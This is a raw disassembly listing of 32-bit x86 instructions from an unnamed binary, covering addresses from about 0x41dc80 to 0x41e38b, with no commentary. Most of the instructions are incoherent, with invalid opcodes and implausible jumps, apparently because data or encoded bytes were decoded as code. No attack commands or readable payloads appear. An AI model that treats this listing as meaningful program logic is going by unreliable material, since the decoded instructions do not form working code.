  41dc80:	jne    0x41dcd1
  41dc82:	cmp    eax,0x62a7a4e1
  41dc87:	out    0x7c,eax
  41dc89:	lahf   
  41dc8a:	xchg   ebx,eax
  41dc8b:	xchg   DWORD PTR [ebp+0x70],edi
  41dc8e:	clc    
  41dc8f:	or     bx,WORD PTR [ebx]
  41dc92:	jmp    0x954aa4e4
  41dc97:	dec    ebx
  41dc98:	push   ss
  41dc99:	cmp    al,0xa0
  41dc9b:	stos   BYTE PTR es:[edi],al
  41dc9c:	pushf  
  41dc9d:	inc    ebx
  41dc9e:	pop    esi
  41dc9f:	nop
  41dca0:	or     ch,BYTE PTR [edi+edx*2]
  41dca3:	rol    DWORD PTR [edi],1
  41dca5:	ret    
  41dca6:	mov    WORD PTR [edx],fs
  41dca8:	data16 clc 
  41dcaa:	push   ds
  41dcab:	xor    dh,BYTE PTR [ebp-0x6e]
  41dcae:	enter  0xb60a,0xaf
  41dcb2:	ss ja  0x41dc8e
  41dcb5:	ret    0x4905
  41dcb8:	pop    ds
  41dcb9:	iret   
  41dcba:	fst    st(2)
  41dcbc:	enter  0xf86f,0xd2
  41dcc0:	inc    edi
  41dcc1:	mov    edi,0xf627e48f
  41dcc6:	add    DWORD PTR [eax],eax
  41dcc8:	call   0xa941dcce
  41dccd:	add    edi,DWORD PTR [edx+0x17a5bc2c]
  41dcd3:	xor    DWORD PTR [ecx],edi
  41dcd5:	outs   dx,BYTE PTR ds:[esi]
  41dcd6:	call   DWORD PTR [eax-0x1d]
  41dcd9:	xor    ah,bl
  41dcdb:	std    
  41dcdc:	mov    edi,0xc18e3d14
  41dce1:	out    dx,al
  41dce2:	mov    al,0x3b
  41dce4:	cwde   
  41dce5:	jle    0x41dc78
  41dce7:	retf   0x31c8
  41dcea:	jecxz  0x41dcaf
  41dcec:	xchg   ebp,eax
  41dced:	sub    eax,0xbfa255d9
  41dcf2:	jmp    0x41dce3
  41dcf4:	push   0x29
  41dcf6:	pop    ss
  41dcf7:	mov    cl,0x2b
  41dcf9:	and    BYTE PTR [edi],dh
  41dcfb:	(bad)  
  41dcfc:	test   DWORD PTR [esp+edi*1+0x14b23ae9],0x110da0df
  41dd07:	(bad)  
  41dd08:	cdq    
  41dd09:	jmp    0x41dcd8
  41dd0b:	rol    BYTE PTR ds:0x2811acf6,cl
  41dd11:	jae    0x41dcba
  41dd13:	or     eax,DWORD PTR [ecx+ebx*1]
  41dd16:	and    eax,0x6dd9fb05
  41dd1b:	data16 and BYTE PTR [ebp+esi*1+0x4eb8d267],dl
  41dd23:	mov    ah,BYTE PTR [edx+0x5a81c3e0]
  41dd29:	xor    cl,BYTE PTR [ebx-0x16]
  41dd2c:	out    dx,eax
  41dd2d:	rcr    dh,0x1e
  41dd30:	cli    
  41dd31:	(bad)  
  41dd32:	jb     0x41dd21
  41dd34:	loop   0x41dd71
  41dd36:	and    BYTE PTR [ecx-0x6d],ch
  41dd39:	inc    BYTE PTR [edi+edx*1-0x48]
  41dd3d:	cwde   
  41dd3e:	cdq    
  41dd3f:	aas    
  41dd40:	pop    DWORD PTR [ebx+0x314d1fee]
  41dd46:	mov    WORD PTR [ebx*1+0x324da208],?
  41dd4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd4e:	mov    ah,BYTE PTR [eax+0xb]
  41dd51:	(bad)  
  41dd52:	popf   
  41dd53:	add    DWORD PTR [eax+0x42552547],esp
  41dd59:	push   eax
  41dd5a:	punpcklbw mm2,DWORD PTR [esi+0xf803f76]
  41dd61:	out    dx,eax
  41dd62:	adc    esp,0xbbfb84f7
  41dd68:	jo     0x41dd01
  41dd6a:	pushf  
  41dd6b:	or     edx,DWORD PTR [ecx]
  41dd6d:	dec    ebx
  41dd6e:	add    DWORD PTR [eax+0x67],0x57
  41dd72:	push   esp
  41dd73:	mov    al,ds:0xc5119989
  41dd78:	test   al,0x27
  41dd7a:	inc    esi
  41dd7b:	ret    0xa139
  41dd7e:	imul   edx,DWORD PTR [ebx-0x69522e49],0xffffffde
  41dd85:	inc    esp
  41dd86:	clc    
  41dd87:	into   
  41dd88:	ins    BYTE PTR es:[edi],dx
  41dd89:	ja     0x41dd26
  41dd8b:	ror    DWORD PTR [esi],cl
  41dd8d:	pop    ebp
  41dd8e:	dec    edx
  41dd8f:	loopne 0x41dd92
  41dd91:	and    al,0xd0
  41dd93:	ds mov bl,0x9c
  41dd96:	inc    ebp
  41dd97:	dec    eax
  41dd98:	xchg   BYTE PTR [ebp-0x53e7489],dl
  41dd9e:	xchg   BYTE PTR [edi-0x11f9b02f],dl
  41dda4:	or     eax,DWORD PTR [esi-0x8e36d68]
  41ddaa:	xchg   ebx,eax
  41ddab:	sti    
  41ddac:	mov    eax,ds:0xf0722dfa
  41ddb1:	xchg   DWORD PTR [ebp-0xc],edx
  41ddb4:	adc    eax,0x163872da
  41ddb9:	mov    ds:0x58e70236,al
  41ddbe:	inc    ebx
  41ddbf:	in     eax,0xe7
  41ddc1:	int    0x5b
  41ddc3:	mov    esp,0xe24cd042
  41ddc8:	arpl   WORD PTR [ebx-0x63c7e6a8],di
  41ddce:	jg     0x41ddc3
  41ddd0:	in     al,dx
  41ddd1:	and    eax,0x1bc81754
  41ddd6:	and    eax,DWORD PTR [ecx]
  41ddd8:	(bad)  
  41ddd9:	nop
  41ddda:	lea    ecx,[ecx+0x4bb78b77]
  41dde0:	(bad)  
  41dde1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dde2:	push   edi
  41dde3:	jmp    0x5eb9cc27
  41dde8:	das    
  41dde9:	jmp    0xb015743f
  41ddee:	adc    al,0xbf
  41ddf0:	xchg   edi,eax
  41ddf1:	test   eax,0xde7e3cc3
  41ddf6:	mov    BYTE PTR gs:[edi+0x48],bh
  41ddfa:	pushw  0x222c
  41ddfe:	call   0xc8d0:0xd8fddc2
  41de05:	mov    al,0x54
  41de07:	loope  0x41ddb9
  41de09:	mov    esp,0x898888a8
  41de0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de0f:	jmp    0xeb00b451
  41de14:	je     0x41ddf0
  41de16:	mov    eax,0x318840da
  41de1b:	mov    dh,0xc8
  41de1d:	aaa    
  41de1e:	retf   0xb457
  41de21:	xchg   ebx,eax
  41de22:	cmp    eax,0x95d58db9
  41de27:	xor    DWORD PTR [ebx-0x2a],ebp
  41de2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de2b:	xchg   ebp,eax
  41de2c:	cmp    DWORD PTR [edi+0x7],0x61
  41de30:	xchg   edx,eax
  41de31:	inc    eax
  41de32:	xlat   BYTE PTR ds:[ebx]
  41de33:	das    
  41de34:	and    dh,BYTE PTR [esp+ebp*2+0x7b]
  41de38:	fwait
  41de39:	push   ds
  41de3a:	mov    ch,0xc2
  41de3c:	mov    edi,0xd48bd0dc
  41de41:	add    bh,al
  41de43:	nop
  41de44:	sti    
  41de45:	out    dx,al
  41de46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41de47:	lods   eax,DWORD PTR ds:[esi]
  41de48:	xchg   esi,eax
  41de49:	adc    edi,0x0
  41de4c:	push   ss
  41de4d:	add    ecx,DWORD PTR [ecx+0x1da86977]
  41de53:	adc    bl,ch
  41de55:	scas   eax,DWORD PTR es:[edi]
  41de56:	xor    eax,0xf0257bec
  41de5b:	cmp    DWORD PTR [ebp+0x38],eax
  41de5e:	loop   0x41dec4
  41de60:	cwde   
  41de61:	add    BYTE PTR [ebx-0x4f],0x7d
  41de65:	(bad)  
  41de66:	or     al,0x91
  41de68:	jbe    0x41de4a
  41de6a:	xchg   ebx,eax
  41de6b:	adc    DWORD PTR [ecx],0x24
  41de6e:	inc    ebp
  41de6f:	push   edx
  41de70:	ds inc edi
  41de72:	inc    edi
  41de73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de74:	add    eax,ecx
  41de76:	xor    eax,0xc9f67a7
  41de7b:	mov    ds:0x9ccc1813,eax
  41de80:	or     eax,0x23f7f602
  41de85:	call   0xa16c6bab
  41de8a:	ins    BYTE PTR es:[edi],dx
  41de8b:	sbb    bl,BYTE PTR [esi+0x1b]
  41de8e:	aam    0x84
  41de90:	aas    
  41de91:	dec    edx
  41de92:	mov    bh,0x20
  41de94:	add    edx,DWORD PTR [esi-0x2ec87caa]
  41de9a:	fstp   st(7)
  41de9c:	outs   dx,DWORD PTR ds:[esi]
  41de9d:	adc    edx,DWORD PTR [edi-0x71]
  41dea0:	les    edx,FWORD PTR [ebx+0xec967cf]
  41dea6:	adc    al,0x31
  41dea8:	rcr    edx,1
  41deaa:	bound  esi,QWORD PTR [esi]
  41deac:	xchg   BYTE PTR [ebp-0x64],bl
  41deaf:	fld    TBYTE PTR [edx+ecx*1+0x5f618058]
  41deb6:	lock (bad) 
  41deb8:	(bad)  
  41deb9:	out    dx,eax
  41deba:	repz pop edi
  41debc:	mov    dl,0xc5
  41debe:	ret    
  41debf:	in     eax,dx
  41dec0:	adc    BYTE PTR [esi+0x35],ah
  41dec3:	jmp    0x15:0x1f80f
  41deca:	add    BYTE PTR [eax],al
  41decc:	mov    ah,BYTE PTR [ebp-0x41]
  41decf:	cmp    bl,dl
  41ded1:	popf   
  41ded2:	mov    ?,WORD PTR [ebx-0x39]
  41ded5:	mov    esp,0x34647cb0
  41deda:	mov    al,ds:0x99045544
  41dedf:	pop    esp
  41dee0:	les    eax,FWORD PTR [eax]
  41dee2:	add    BYTE PTR [eax],al
  41dee4:	add    BYTE PTR [eax],al
  41dee6:	inc    ebx
  41dee7:	add    BYTE PTR [eax+eax*1],al
  41deea:	inc    ebx
  41deeb:	add    BYTE PTR [eax],cl
  41deed:	add    BYTE PTR [ebx+0x0],al
  41def0:	or     al,0x0
  41def2:	inc    ebx
  41def3:	add    BYTE PTR [eax],dl
  41def5:	add    BYTE PTR [ebx+0x0],al
  41def8:	adc    al,0x0
  41defa:	inc    ebx
  41defb:	add    BYTE PTR [eax],bl
  41defd:	add    BYTE PTR [ebx+0x0],al
  41df00:	sbb    al,0x0
  41df02:	inc    ebx
  41df03:	add    BYTE PTR [eax],al
  41df05:	adc    BYTE PTR [ebx+0x0],al
  41df08:	add    al,0x10
  41df0a:	inc    ebx
  41df0b:	add    BYTE PTR [eax],cl
  41df0d:	adc    BYTE PTR [ebx+0x0],al
  41df10:	or     al,0x10
  41df12:	inc    ebx
  41df13:	add    BYTE PTR [eax],dl
  41df15:	adc    BYTE PTR [ebx+0x0],al
  41df18:	adc    al,0x10
  41df1a:	inc    ebx
  41df1b:	add    BYTE PTR [eax],bl
  41df1d:	adc    BYTE PTR [ebx+0x0],al
  41df20:	sbb    al,0x10
  41df22:	inc    ebx
  41df23:	add    BYTE PTR [eax],al
  41df25:	and    BYTE PTR [ebx+0x0],al
  41df28:	add    al,0x20
  41df2a:	inc    ebx
  41df2b:	add    BYTE PTR [eax],cl
  41df2d:	and    BYTE PTR [ebx+0x0],al
  41df30:	or     al,0x20
  41df32:	inc    ebx
  41df33:	add    BYTE PTR [eax],dl
  41df35:	and    BYTE PTR [ebx+0x0],al
  41df38:	adc    al,0x20
  41df3a:	inc    ebx
  41df3b:	add    BYTE PTR [eax],bl
  41df3d:	and    BYTE PTR [ebx+0x0],al
  41df40:	sbb    al,0x20
  41df42:	inc    ebx
  41df43:	add    BYTE PTR [eax+0x66],bh
  41df46:	ins    BYTE PTR es:[edi],dx
  41df47:	jp     0x41dfa0
  41df49:	jbe    0x41df92
  41df4b:	ja     0x41df90
  41df4d:	js     0x41df97
  41df4f:	jno    0x41dfa1
  41df51:	arpl   WORD PTR [ebx+0x6f],dx
  41df54:	inc    edi
  41df55:	dec    esi
  41df56:	outs   dx,DWORD PTR ds:[esi]
  41df57:	pop    ecx
  41df58:	inc    edi
  41df59:	jb     0x41dfa2
  41df5b:	jns    0x41dfd3
  41df5d:	inc    ecx
  41df5e:	pop    eax
  41df5f:	dec    esp
  41df60:	add    BYTE PTR [eax],al
  41df62:	add    BYTE PTR [eax],al
  41df64:	in     al,dx
  41df65:	loop   0x41dfa8
  41df67:	add    ah,dh
  41df69:	loop   0x41dfac
  41df6b:	add    BYTE PTR [ecx+eiz*8+0xbef0041],ch
  41df72:	mov    dl,0xe
  41df74:	jns    0x41dfc4
  41df76:	xor    BYTE PTR [esi-0x79],cl
  41df79:	dec    edi
  41df7a:	cmp    eax,0x3e4faf4e
  41df7f:	dec    esi
  41df80:	js     0x41dfd0
  41df82:	cmp    ecx,DWORD PTR [esi-0x64]
  41df85:	dec    edi
  41df86:	inc    esp
  41df87:	dec    esi
  41df88:	jae    0x41dfd8
  41df8a:	inc    ecx
  41df8b:	dec    esi
  41df8c:	xor    BYTE PTR [esi+0x40],cl
  41df8f:	dec    esi
  41df90:	pop    esp
  41df91:	pop    ebp
  41df92:	pop    edi
  41df93:	push   edx
  41df94:	cmp    DWORD PTR [esi+0x79],ecx
  41df97:	dec    esi
  41df98:	xor    BYTE PTR [esi-0x79],cl
  41df9b:	dec    edi
  41df9c:	cmp    eax,0x3e4faf4e
  41dfa1:	dec    esi
  41dfa2:	js     0x41dff2
  41dfa4:	cmp    ecx,DWORD PTR [esi-0x64]
  41dfa7:	dec    edi
  41dfa8:	inc    esp
  41dfa9:	dec    esi
  41dfaa:	mov    DWORD PTR [edi+0x41],ecx
  41dfad:	dec    esi
  41dfae:	xor    BYTE PTR [esi+0x40],cl
  41dfb1:	dec    esi
  41dfb2:	pop    esp
  41dfb3:	ins    DWORD PTR es:[edi],dx
  41dfb4:	pop    edi
  41dfb5:	bound  edi,QWORD PTR [ecx]
  41dfb7:	dec    esi
  41dfb8:	jns    0x41e008
  41dfba:	xor    BYTE PTR [esi-0x80],cl
  41dfbd:	dec    edi
  41dfbe:	cmp    eax,0x394e734e
  41dfc3:	dec    esi
  41dfc4:	mov    ds:0x304e3a4f,al
  41dfc9:	dec    esi
  41dfca:	inc    esi
  41dfcb:	dec    esi
  41dfcc:	pop    esp
  41dfcd:	jge    0x41e02e
  41dfcf:	jb     0x41e040
  41dfd1:	sub    BYTE PTR [esi-0x7d],0x7e
  41dfd5:	xchg   ebx,eax
  41dfd6:	jns    0x41df68
  41dfd8:	aas    
  41dfd9:	dec    esi
  41dfda:	test   BYTE PTR [edi+0x30],cl
  41dfdd:	dec    esi
  41dfde:	test   BYTE PTR [edi+0x3c],cl
  41dfe1:	dec    esi
  41dfe2:	mov    ds:0x734e394f,al
  41dfe7:	dec    esi
  41dfe8:	inc    ebp
  41dfe9:	dec    esi
  41dfea:	xor    BYTE PTR [esi+0x44],cl
  41dfed:	dec    esi
  41dfee:	pop    esp
  41dfef:	lea    ebx,[edi-0x7e]
  41dff2:	outs   dx,DWORD PTR ds:[esi]
  41dff3:	xchg   edx,eax
  41dff4:	outs   dx,BYTE PTR ds:[esi]
  41dff5:	xchg   ebx,eax
  41dff6:	jle    0x41df9b
  41dff8:	jns    0x41df9a
  41dffa:	aas    
  41dffb:	dec    esi
  41dffc:	test   BYTE PTR [edi+0x30],cl
  41dfff:	dec    esi
  41e000:	test   BYTE PTR [edi+0x3c],cl
  41e003:	dec    esi
  41e004:	mov    ds:0x894e394f,al
  41e009:	dec    edi
  41e00a:	inc    ebp
  41e00b:	dec    esi
  41e00c:	xor    BYTE PTR [esi+0x44],cl
  41e00f:	dec    esi
  41e010:	pop    esp
  41e011:	popf   
  41e012:	pop    edi
  41e013:	xchg   edx,eax
  41e014:	outs   dx,DWORD PTR ds:[esi]
  41e015:	mov    ds:0xb37ea36e,al
  41e01a:	jns    0x41dfcc
  41e01c:	aas    
  41e01d:	dec    esi
  41e01e:	mov    cs,WORD PTR [edi+0x30]
  41e021:	dec    esi
  41e022:	lods   al,BYTE PTR ds:[esi]
  41e023:	dec    edi
  41e024:	cmp    eax,0x394e734e
  41e029:	dec    esi
  41e02a:	mov    eax,ds:0x304e3a4f
  41e02f:	dec    esi
  41e030:	inc    esp
  41e031:	dec    esi
  41e032:	pop    esp
  41e033:	lods   eax,DWORD PTR ds:[esi]
  41e034:	pop    edi
  41e035:	mov    ds:0xb36eb26f,al
  41e03a:	jle    0x41dfff
  41e03c:	jns    0x41dffe
  41e03e:	aas    
  41e03f:	dec    esi
  41e040:	mov    cs,WORD PTR [edi+0x30]
  41e043:	dec    esi
  41e044:	lods   al,BYTE PTR ds:[esi]
  41e045:	dec    edi
  41e046:	cmp    eax,0x394e7e4e
  41e04b:	dec    esi
  41e04c:	lahf   
  41e04d:	dec    edi
  41e04e:	cmp    ecx,DWORD PTR [esi+0x30]
  41e051:	dec    esi
  41e052:	inc    ebp
  41e053:	dec    esi
  41e054:	pop    esp
  41e055:	mov    ebp,0xc26fb25f
  41e05a:	outs   dx,BYTE PTR ds:[esi]
  41e05b:	ret    
  41e05c:	jle    0x41e031
  41e05e:	jns    0x41e030
  41e060:	aas    
  41e061:	dec    esi
  41e062:	mov    cs,WORD PTR [edi+0x30]
  41e065:	dec    esi
  41e066:	lods   al,BYTE PTR ds:[esi]
  41e067:	dec    edi
  41e068:	cmp    eax,0x394f804e
  41e06d:	dec    esi
  41e06e:	lods   al,BYTE PTR ds:[esi]
  41e06f:	dec    edi
  41e070:	cmp    cl,BYTE PTR [esi+0x30]
  41e073:	dec    esi
  41e074:	inc    esi
  41e075:	dec    esi
  41e076:	pop    esp
  41e077:	int    0x5f
  41e079:	ret    0xd26f
  41e07c:	outs   dx,BYTE PTR ds:[esi]
  41e07d:	sar    DWORD PTR [esi-0x1d],cl
  41e080:	jns    0x41e062
  41e082:	aas    
  41e083:	dec    esi
  41e084:	mov    cs,WORD PTR [edi+0x30]
  41e087:	dec    esi
  41e088:	lods   al,BYTE PTR ds:[esi]
  41e089:	dec    edi
  41e08a:	cmp    eax,0x394f834e
  41e08f:	dec    esi
  41e090:	mov    ds:0x304e3a4f,al
  41e095:	dec    esi
  41e096:	inc    esp
  41e097:	dec    esi
  41e098:	pop    esp
  41e099:	fstp   QWORD PTR [edi-0x2e]
  41e09c:	outs   dx,DWORD PTR ds:[esi]
  41e09d:	loop   0x41e10d
  41e09f:	jecxz  0x41e11f
  41e0a1:	repz jns 0x41e094
  41e0a4:	aas    
  41e0a5:	dec    esi
  41e0a6:	lea    ecx,[edi+0x30]
  41e0a9:	dec    esi
  41e0aa:	lahf   
  41e0ab:	dec    edi
  41e0ac:	cmp    eax,0x3c4fa04e
  41e0b1:	dec    esi
  41e0b2:	xor    BYTE PTR [esi+0x3f],cl
  41e0b5:	dec    esi
  41e0b6:	pop    esp
  41e0b7:	in     eax,dx
  41e0b8:	pop    edi
  41e0b9:	loop   0x41e12a
  41e0bb:	repnz outs dx,BYTE PTR ds:[esi]
  41e0bd:	repz jle 0x41e0c3
  41e0c0:	jns    0x41e0c2
  41e0c2:	jle    0x41e0d7
  41e0c4:	jns    0x41e0d6
  41e0c6:	cmp    al,0x4e
  41e0c8:	jg     0x41e118
  41e0ca:	xor    BYTE PTR [esi-0x65],cl
  41e0cd:	dec    edi
  41e0ce:	xor    cl,BYTE PTR [esi-0x80]
  41e0d1:	dec    edi
  41e0d2:	cmp    al,0x4e
  41e0d4:	lods   eax,DWORD PTR ds:[esi]
  41e0d5:	dec    edi
  41e0d6:	cmp    ecx,DWORD PTR [esi+0x30]
  41e0d9:	dec    esi
  41e0da:	inc    ebp
  41e0db:	dec    esi
  41e0dc:	pop    esp
  41e0dd:	or     eax,0x126f025f
  41e0e2:	outs   dx,BYTE PTR ds:[esi]
  41e0e3:	adc    edi,DWORD PTR [esi+0x23]
  41e0e6:	jns    0x41e108
  41e0e8:	aas    
  41e0e9:	dec    esi
  41e0ea:	add    BYTE PTR [eax],al
  41e0ec:	je     0x41e0cd
  41e0ee:	inc    ecx
  41e0ef:	add    BYTE PTR [eax-0x1f],ch
  41e0f2:	inc    ecx
  41e0f3:	add    BYTE PTR [eax-0x1f],dh
  41e0f6:	inc    ecx
  41e0f7:	add    al,bh
  41e0f9:	loop   0x41e13c
  41e0fb:	add    BYTE PTR [edx+eiz*8+0x41],ah
  41e0ff:	add    al,ch
  41e101:	loop   0x41e144
  41e103:	add    BYTE PTR [eax-0x1f],dl
  41e106:	inc    ecx
  41e107:	add    BYTE PTR [ecx+eiz*8+0x41],dl
  41e10b:	add    ah,ah
  41e10d:	loop   0x41e150
  41e10f:	add    BYTE PTR [eax+0xd0041e1],bh
  41e115:	test   eax,0xba36f89c
  41e11a:	pushf  
  41e11b:	clc    
  41e11c:	ins    BYTE PTR es:[edi],dx
  41e11d:	loope  0x41e160
  41e11f:	add    BYTE PTR [edx+eiz*8],bl
  41e122:	inc    ecx
  41e123:	add    BYTE PTR [eax],dh
  41e125:	loop   0x41e168
  41e127:	add    BYTE PTR [edx+eiz*8],bh
  41e12a:	inc    ecx
  41e12b:	add    BYTE PTR [edx+eiz*8+0x41],cl
  41e12f:	add    BYTE PTR [ecx+eiz*8-0x208fffbf],ah
  41e136:	inc    ecx
  41e137:	add    ah,al
  41e139:	loope  0x41e17c
  41e13b:	add    BYTE PTR [ecx+eiz*8-0x1d03ffbf],dh
  41e142:	inc    ecx
  41e143:	add    BYTE PTR [esi+0x19f89c85],dh
  41e149:	or     edx,DWORD PTR [edi]
  41e14b:	cmp    DWORD PTR [eax-0x1f],0x1c140041
  41e152:	push   ss
  41e153:	or     DWORD PTR [eax],0x7050d
  41e159:	add    BYTE PTR [eax+0x0],al
  41e15c:	cmp    al,BYTE PTR [edx+0x3e]
  41e15f:	ds retf 0x42e7
  41e163:	add    BYTE PTR [ebp+0x55],ch
  41e166:	inc    esp
  41e167:	imul   ecx,DWORD PTR [eax],0x86275fa
  41e16d:	in     eax,dx
  41e16e:	inc    BYTE PTR [edi]
  41e170:	aas    
  41e171:	cli    
  41e172:	mov    ds:0x41e16005,eax
  41e177:	add    BYTE PTR [ebp-0x4a07636b],dh
  41e17d:	xchg   esi,eax
  41e17e:	pushf  
  41e17f:	clc    
  41e180:	mov    ah,0x95
  41e182:	pushf  
  41e183:	clc    
  41e184:	mov    ebx,0xbaf89c95
  41e189:	xchg   ebp,eax
  41e18a:	pushf  
  41e18b:	clc    
  41e18c:	mov    ecx,0xb8f89c95
  41e191:	xchg   ebp,eax
  41e192:	pushf  
  41e193:	clc    
  41e194:	mov    edi,0xbef89c95
  41e199:	xchg   ebp,eax
  41e19a:	pushf  
  41e19b:	clc    
  41e19c:	mov    ebp,0xa6f89c95
  41e1a1:	xchg   ebp,eax
  41e1a2:	pushf  
  41e1a3:	clc    
  41e1a4:	jmp    0x41df:0x686003f9
  41e1ab:	add    BYTE PTR [eax+esi*4+0x77530042],cl
  41e1b2:	jbe    0x41e204
  41e1b4:	mov    dh,0x85
  41e1b6:	pushf  
  41e1b7:	clc    
  41e1b8:	sbb    ecx,ebp
  41e1ba:	push   eax
  41e1bb:	pop    es
  41e1bc:	es pop es
  41e1be:	add    BYTE PTR [eax],al
  41e1c0:	fild   WORD PTR fs:[ecx+0x0]
  41e1c4:	sbb    ecx,DWORD PTR [ebx]
  41e1c6:	add    al,0xe
	...
  41e1f8:	mov    WORD PTR [eax-0x7a49ffbe],?
  41e1fe:	pushf  
  41e1ff:	clc    
  41e200:	addr16 pushw 0x68
  41e204:	addr16 push 0x67
  41e207:	pushw  0x6b6a
  41e20b:	push   0x676b67
	...
  41e218:	es aas 
  41e21a:	inc    eax
  41e21b:	add    BYTE PTR [ebp-0x5db060b1],ah
  41e221:	dec    edi
  41e222:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e223:	dec    edi
  41e224:	lahf   
  41e225:	dec    edi
  41e226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e227:	dec    edi
  41e228:	ins    DWORD PTR es:[edi],dx
  41e229:	dec    esi
  41e22a:	bound  ecx,QWORD PTR [esi+0x30]
  41e22d:	dec    esi
  41e22e:	add    BYTE PTR [eax],al
  41e230:	cdq    
  41e231:	dec    edi
  41e232:	pushf  
  41e233:	dec    edi
  41e234:	fwait
  41e235:	dec    edi
  41e236:	ins    DWORD PTR es:[edi],dx
  41e237:	dec    esi
  41e238:	bound  ecx,QWORD PTR [esi+0x30]
  41e23b:	dec    esi
  41e23c:	scas   eax,DWORD PTR es:[edi]
  41e23d:	dec    edi
  41e23e:	lods   eax,DWORD PTR ds:[esi]
  41e23f:	dec    edi
  41e240:	lahf   
  41e241:	dec    edi
  41e242:	mov    ds:0x624e6d4f,al
  41e247:	dec    esi
  41e248:	xor    BYTE PTR [esi+0x0],cl
  41e24b:	add    BYTE PTR [ebp-0x5bb067b1],ch
  41e251:	dec    edi
  41e252:	test   eax,0xa04f934f
  41e257:	dec    edi
  41e258:	fwait
  41e259:	dec    edi
  41e25a:	xor    BYTE PTR [esi+0x0],cl
  41e25d:	add    BYTE PTR [eax],al
  41e25f:	add    BYTE PTR [eax],al
  41e261:	add    BYTE PTR [eax],al
  41e263:	add    BYTE PTR [ebp+edi*2-0x62737274],cl
  41e26a:	mov    WORD PTR [ebp-0x32734274],gs
  41e270:	mov    ebp,ds
  41e272:	mov    ebp,gs
  41e274:	mov    ebp,?
  41e276:	mov    WORD PTR ds:0x2d8c1d8c,cs
  41e27c:	mov    WORD PTR ds:0x6d8c5d8c,?
  41e282:	mov    WORD PTR [edx-0x74],?
  41e285:	jae    0x41e213
  41e287:	jo     0x41e215
  41e289:	jno    0x41e217
  41e28b:	jbe    0x41e219
  41e28d:	ja     0x41e21b
  41e28f:	je     0x41e21d
  41e291:	jne    0x41e21f
  41e293:	mov    cl,BYTE PTR [ebx+ecx*4-0x76737774]
  41e29a:	mov    WORD PTR [esi+0x7d9c7c8c],cs
  41e2a0:	lods   al,BYTE PTR ds:[esi]
  41e2a1:	jge    0x41e25f
  41e2a3:	jge    0x41e243
  41e2a5:	(bad)  
  41e2a6:	jns    0x41e31b
  41e2a8:	mov    ecx,0x7d738cb1
  41e2ad:	ins    DWORD PTR es:[edi],dx
  41e2ae:	enter  0x9fc6,0x26
  41e2b2:	jb     0x41e2b7
  41e2b4:	test   eax,0xb956bb17
  41e2b9:	hlt    
  41e2ba:	test   al,0x37
  41e2bc:	test   al,0x7e
  41e2be:	fnstenv [ecx-0x6a]
  41e2c1:	mov    cl,0x6a
  41e2c3:	push   0xffffffce
  41e2c5:	or     BYTE PTR [edx],bl
  41e2c7:	xlat   BYTE PTR ds:[ebx]
  41e2c8:	out    dx,eax
  41e2c9:	add    eax,0x9321d7aa
  41e2ce:	scas   al,BYTE PTR es:[edi]
  41e2cf:	adc    DWORD PTR [esi],esp
  41e2d1:	jge    0x41e2f6
  41e2d3:	fidiv  WORD PTR [edi]
  41e2d5:	leave  
  41e2d6:	hlt    
  41e2d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2d8:	cmp    ax,0x1fc8
  41e2dc:	mov    dh,cl
  41e2de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2df:	(bad)  
  41e2e0:	and    DWORD PTR [eax],ebx
  41e2e2:	and    DWORD PTR [ecx-0x18],esi
  41e2e5:	(bad)  [ebx+0x7]
  41e2e8:	cmc    
  41e2e9:	enter  0x301a,0x40
  41e2ed:	mov    al,0x42
  41e2ef:	add    BYTE PTR [ecx+0x66],dh
  41e2f2:	jp     0x41e362
  41e2f4:	pop    eax
  41e2f5:	loope  0x41e338
  41e2f7:	add    BYTE PTR [ecx+eiz*8-0x12f7ffbf],bh
  41e2fe:	adc    al,BYTE PTR [edi]
  41e300:	imul   esp,DWORD PTR [esi+0x4f],0x6f704c74
  41e307:	ins    BYTE PTR es:[edi],dx
  41e308:	push   0x49657557
  41e30d:	imul   eax,DWORD PTR fs:[ecx+edi*2+0x54],0x62
  41e313:	push   edi
  41e314:	ins    BYTE PTR es:[edi],dx
  41e315:	inc    edx
  41e316:	push   0x76666a73
  41e31b:	inc    edx
  41e31c:	jo     0x41e367
  41e31e:	dec    ebp
  41e31f:	dec    ebp
  41e320:	pop    edx
  41e321:	jp     0x41e37d
  41e323:	jbe    0x41e36b
  41e325:	pop    ecx
  41e326:	jo     0x41e3a0
	...
  41e33c:	inc    ebp
  41e33d:	push   edx
  41e33e:	jb     0x41e3b4
  41e340:	inc    esi
  41e341:	je     0x41e384
  41e343:	inc    esi
  41e344:	jae    0x41e3bc
  41e346:	dec    ebx
  41e347:	gs inc edx
  41e349:	inc    bx
  41e34b:	push   ebp
  41e34c:	jno    0x41e3c4
  41e34e:	ja     0x41e3b7
  41e350:	dec    edi
  41e351:	dec    esp
  41e352:	dec    ebp
  41e353:	inc    edx
  41e354:	jno    0x41e3c7
  41e356:	jae    0x41e3ab
  41e358:	dec    eax
  41e359:	inc    ebp
  41e35a:	inc    esp
  41e35b:	inc    esp
  41e35c:	push   ecx
  41e35d:	dec    edx
  41e35e:	ins    BYTE PTR es:[edi],dx
  41e35f:	dec    ebx
  41e360:	jbe    0x41e3d0
  41e362:	pop    eax
  41e363:	jbe    0x41e3b0
  41e365:	inc    ecx
  41e366:	fs gs jno 0x41e3d7
  41e36a:	push   ebx
  41e36b:	inc    ecx
  41e36c:	add    BYTE PTR [eax],al
  41e36e:	inc    ebx
  41e36f:	outs   dx,BYTE PTR ds:[esi]
  41e370:	imul   esp,DWORD PTR [edi+0x7a],0x6f
  41e374:	push   edx
  41e375:	push   ecx
  41e376:	push   0x74000064
  41e37b:	jne    0x41e3f2
  41e37d:	ins    DWORD PTR es:[edi],dx
  41e37e:	push   ecx
  41e37f:	push   eax
  41e380:	jo     0x41e3fc
  41e382:	addr16 jo 0x41e3db
  41e385:	pop    eax
  41e386:	add    BYTE PTR [eax],al
  41e388:	push   ecx
  41e389:	pop    ecx
  41e38a:	inc    ebx
  41e38b:	inc    edx
